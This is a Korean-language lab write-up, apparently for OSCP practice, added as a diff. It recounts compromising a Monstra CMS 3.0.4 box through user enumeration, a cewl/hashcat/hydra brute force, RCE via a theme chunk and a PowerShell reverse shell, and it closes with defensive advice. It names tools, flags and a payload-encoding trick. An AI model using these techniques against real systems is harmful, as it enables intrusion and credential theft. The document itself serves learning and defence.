+if ($_SESSION['cryptcode'] and ($_SESSION['cryptcode'] == $code)) {
+```
+
+세션값이 없으면 첫 조건에서 그냥 false 다.
+
+**문제는 이 15분이 통째로 무의미했다는 것이다.** `users.plugin.php` 의 가입 처리는 role 을 하드코딩한다.
+
+```php
+Users::$users->insert(array('login'    => Security::safeName($user_login),
+                     'password'        => Security::encryptPassword(Request::post('password')),
+                     ...
+                     'role'            => 'user'));
+```
+
+그리고 프로필 수정(`getProfileEdit`)이 업데이트하는 필드는 `login/firstname/lastname/email/skype/about_me/twitter` 뿐 — **role 은 매스 어사인먼트가 안 된다.** filesmanager·themes 같은 관리 플러그인은 `in_array(Session::get('user_role'), array('admin','editor'))` 로 걸린다.
+
+**"들어갈 수 있나"보다 "들어가면 뭘 할 수 있나"를 먼저 봤어야 했다.** 소스가 손에 있었는데 이미지 픽셀부터 셌다.
+
+### 3. `.php7` 업로드가 안 먹혔다
+
+§3 에 적은 그대로다. 블랙리스트에 `php7` 이 없는 것은 **소스로 확인했고 사실이다.** 그런데 업로드 자체가 죽어 있어서 EDB-48479·EDB-49949 가 둘 다 무용지물이었다.
+
+`.txt`·`.jpg` 로 테스트해서 **"확장자 필터가 아니라 업로드 기능"** 이라고 계층을 분리한 것이 방향 전환에 결정적이었다. 이걸 안 했으면 `.pht`·`.phar`·이중확장자·널바이트로 한참 더 헤맸을 것이다.
+
+일반화: **CMS 관리자 패널을 잡으면 업로드만 보지 마라.** 테마/템플릿/스니펫 에디터, 플러그인 설치, 백업 복원 — PHP 를 디스크에 쓰는 경로는 보통 여러 개다.
+
+### 4. 도구 쪽에서 태운 시간
+
+- **`hashcat --stdout -r best64.rule` 이 조용히 0줄을 뱉었다.** Kali 의 hashcat 7.1.2 에는 `best64.rule` 이 없고 **`best66.rule`** 이 있다. 에러도 안 났다 — `wc -l` 로 0 을 보고서야 알았다. 룰 파일을 쓰기 전에 `ls /usr/share/hashcat/rules/` 를 한 번 보는 게 맞다.
+- **hydra tmux 세션을 `users.txt` 없이 먼저 띄웠다.** 세션이 즉시 죽고 원인이 안 보였다. tmux 안에서 도는 명령은 실패해도 조용하다 — 파일 의존성은 세션을 만들기 전에 만든다.
+- **`<pre>` 가 든 PHP 페이로드를 heredoc 으로 원격에 쓰려다 인용이 두 번 깨졌다.** `pre: No such file or directory` — 원격 bash 가 `<`를 리다이렉션으로 읽었다. base64 로 감싸 전달하고 `--data-urlencode 'content@파일'` 로 넘기는 것으로 해결했다. **SSH 를 한 번 더 거치는 환경에서 특수문자가 든 페이로드는 인용으로 싸우지 말고 인코딩으로 도망가라.**
+- 예열 스캔을 `--top-ports 200` 으로 돌렸지만 **`-p-` 결과가 나올 때까지 판단을 유보**했다. 결과적으로 추가된 포트는 전부 Windows 기본 구성이라 소득이 없었지만, 순서 자체는 지켜야 한다.
+
+### 5. 안 통한 것들 (전부 확인 후 폐기)
+
+| 시도 | 결과 |
+|---|---|
+| SMB null / guest 세션 | `NT_STATUS_ACCESS_DENIED` / `NT_STATUS_ACCOUNT_DISABLED`. `rpcclient -U '' -N` 도 `Cannot connect`, `enum4linux-ng` 도 세션 실패 |
+| `/blog/storage/database/users.table.xml` 직접 읽기 | 403. Monstra 가 `storage/.htaccess` 에 `Deny from all` 을 넣어 출하한다 |
+| 경로 우회 (`//`, `/./`, 대소문자) | 전부 403 |
+| 로그인/비밀번호재설정의 XPath 인젝션 | 직후 동등검사(`$user['login'] == $_POST['login']`, `$user['hash'] == $_GET['hash']`)가 막는다 |
+| XAMPP `/php-cgi/php-cgi.exe` (CVE-2024-4577) | 엔드포인트는 **있다** — `/php-cgi/php.exe` 는 403 인데 `php-cgi.exe` 만 500 을 준다(XAMPP 의 `<Files "php-cgi.exe">Require all granted` 구성 그대로). 하지만 `%ADd ...`·`-d ...` 둘 다 500 에서 안 움직였다. 이 취약점의 best-fit 문자 매핑은 CJK 코드페이지에서만 성립한다고 알려져 있고, 이 박스는 영문 로케일로 보인다 — **`[가정]`**, 코드페이지를 직접 확인하지는 못했다 |
+| 웹 이미지 exif / strings | 전부 무소득 |
+| UDP top-100 | 열린 포트 없음 |
+
+## 7. OSCP 시험 관점
+
+1. **무명 CMS 를 만나면 순서가 정해져 있다.** ① `generator` 메타·푸터로 버전 확정 → ② `searchsploit` → ③ **"인증 필요"가 붙었는지 확인** → ④ 붙었으면 문제는 익스플로잇이 아니라 크리덴셜이다. 이 박스는 ③에서 방향이 갈렸다.
+2. **사용자 열거가 공짜인 CMS 는 브루트포스를 현실적으로 만든다.** `/users`, `/author/1`, `?author=1`(WordPress), REST API 를 먼저 본다.
+3. **cewl 은 장식이 아니다.** 정답 `wazowski` 는 10k 상용 사전에 없고 사이트 제목에 있었다. `cewl -d 3 -m 4` → `hashcat --stdout -r best66.rule` → hydra 를 한 세트로 외워둔다.
+4. **브루트포스를 시작하기 전에 서버 처리량을 재라.** 병렬 curl 200개 한 줄이면 나온다. 여기는 70 req/s 였고, 그 숫자를 먼저 알았으면 rockyou 를 시도조차 안 했을 것이다. **손절 판단은 감이 아니라 산수다.**
+5. **로그인 잠금을 만나면 그게 서버측인지 클라이언트측인지 먼저 봐라.** 쿠키/localStorage 기반이면 잠금이 아니다. 반대로 **내 수동 시도가 그 잠금에 걸려 정답을 놓칠 수 있다**(§6-1).
+6. **웹셸은 발판이지 목적지가 아니다.** `?cmd=` 가 도는 순간 할 일은 플래그 `type` 이 아니라 리버스셸이다. 시험 규정상 웹셸로 읽은 플래그는 0점이다.
+7. **시간 배분** — 정찰~Monstra 특정 5분, 크리덴셜 확보까지 27분, RCE~셸 8분. 크리덴셜 구간이 전체의 3분의 2였고, 그중 **15분이 캡차 삽질**이었다. 소스가 손에 있을 때는 **엔드포인트를 두드리기 전에 그 엔드포인트로 뭘 할 수 있는지부터 읽어라.**
+
+## 8. 방어 관점
+
+- **Monstra 3.0.4 는 2014년이 마지막 릴리스다.** 유지보수되지 않는 CMS를 인터넷에 노출한 것이 근본 원인이다. 교체가 답이고, 못 하면 최소한 관리자 패널을 IP 로 제한한다.
+- **로그인 잠금을 서버측 카운터로 옮긴다.** 쿠키에 상태를 두면 잠금이 아니다. 계정별/IP별 카운터 + 지수 백오프.
+- **사용자 목록을 공개하지 않는다.** `/blog/users` 는 인증 뒤로 옮기거나 없앤다.
+- **비밀번호를 사이트 콘텐츠에서 파생하지 않는다.** `wazowski` 는 페이지 제목이었다.
+- **업로드 확장자를 블랙리스트로 막지 않는다.** 화이트리스트로 뒤집고, 업로드 디렉터리에서 스크립트 핸들러를 끈다(`php_admin_flag engine off` 또는 `RemoveHandler`).
+- **웹서버를 대화형 로그온 세션에서 돌리지 않는다.** XAMPP Control Panel 을 로그온 시 띄우는 구성은 웹 RCE 를 사용자 세션 장악으로 직결시킨다. 전용 서비스 계정으로 서비스 등록한다.
+
+## 9. 참고 자료
+
+- EDB-52038 — Monstra CMS 3.0.4 RCE (themes → add_chunk). `/usr/share/exploitdb/exploits/php/webapps/52038.py`
+- EDB-48479 / CVE-2017-18048 — filesmanager `.php7` 업로드. **이 박스에서는 업로드 기능이 죽어 있어 못 썼다**
+- EDB-49949 / CVE-2018-6383 — filesmanager `.pht`·`.phar` 업로드. 같은 이유로 못 썼다
+- Monstra 소스 — `https://github.com/monstra-cms/monstra` (판단 근거로 클론해 대조)
+
+## 남긴 흔적
+
+확인한 것만 적는다.
+
+타겟:
+- `C:\xampp\htdocs\blog\public\themes\default\mon9x.chunk.php` — **삭제하지 못했다.** 작업이 끊긴 시점에 남아 있다
+- `admin` 계정으로 Monstra 관리자 로그인 기록
+- 업로드 실패 시도 3건(`shell.php7`·`t.txt`·`t.jpg`) — **파일은 생기지 않았다.** 서버 로그에는 POST 가 남는다
+- `mike` 로 실행 중인 PowerShell 리버스셸 프로세스 1개 (tcp/443 → 192.168.45.207)
+- Apache 액세스/에러 로그에 브루트포스 약 **44,000건**(10k 런 20,000 + cewl 런 약 24,000). **지우지 않았다** — 로그 삭제는 흔적을 더 남기고 되돌릴 수 없다
+
+확인하지 않은 것:
+- Windows 이벤트 로그(Security 4624/4688 등) — **조회하지 못했다**
+- PowerShell 이 `C:\Windows\Temp` 등에 남긴 임시 파일 유무
+
+Kali:
+- `/etc/hosts` 의 `192.168.248.180 monster.pg` — **원복하지 못했다**
+- tmux `mon_lsnr443`(리스너 + 살아 있는 셸)은 **의도적으로 남겼다**. `mon_nmap`·`mon_gob`·`mon_hydra`·`mon_hydra2`·`mon_udp` 는 세션 이름으로 종료 완료(광범위 `pkill` 미사용)
+
+## 관련 노트
+
+- [[Jacko]] — 같은 "1개만 먹고 권한상승 미완" 상태. 둘 다 발판 이후 열거 기록이 얇다
+- [[Squid]] · [[Hub]] · [[Levram]] — 버전 판정은 독립 근거 2개
+- [[Hawat]] · [[Exfiltrated]] · [[Squid]] — 인용이 깨지면 인코딩으로 도망간다(여기서는 base64 + `--data-urlencode`)
+- [[Fowsniff]] — 사이트/OSINT 에서 만든 사전으로 크리덴셜을 뚫은 같은 부류
+- [[_STATUS]]
